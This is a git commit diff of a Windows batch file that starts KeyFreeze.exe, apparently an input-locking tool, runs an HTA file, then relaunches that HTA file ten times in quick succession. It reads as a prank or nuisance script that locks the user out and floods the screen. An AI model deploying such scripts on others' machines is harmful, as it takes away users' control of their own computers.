cbbc05115b1c408451676828fc16e7980d892636
boggisbear <71963580+boggisbear@users.noreply.github.com>
2021-03-27 18:04:43 +1300

    Update 1.bat

--- 1.bat
+++ 1.bat
@@ -2,3 +2,23 @@ cd /d C:\temp\1
 start KeyFreeze.exe
 start "" /wait "2.hta"
 taskkill /IM KeyFreeze.exe /F > nul
+timeout 1
+start "2.hta"
+timeout 1
+start "2.hta"
+timeout 1
+start "2.hta"
+timeout 1
+start "2.hta"
+timeout 1
+start "2.hta"
+timeout 1
+start "2.hta"
+timeout 1
+start "2.hta"
+timeout 1
+start "2.hta"
+timeout 5
+start "2.hta"
+timeout 10
+start "2.hta"
